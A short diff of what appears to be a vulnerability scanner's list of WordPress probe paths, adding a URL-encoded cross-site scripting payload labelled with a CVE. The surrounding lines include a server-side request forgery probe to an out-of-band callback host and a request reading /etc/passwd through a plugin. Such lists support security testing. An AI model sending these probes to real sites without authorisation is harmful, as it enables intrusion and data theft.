@@ -135,3 +135,4 @@
 /wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}
 /wp-content/plugins/planyo-online-reservation-system/readme.txt
 /wp-content/plugins/planyo-online-reservation-system/ulap.php?ulap_url=file://localhost/etc/passwd
+/ngg_tag/cve-2026-28141%22%3E%3Csvg%2Fonload%3Dalert%60{{marker}}%60%3E/
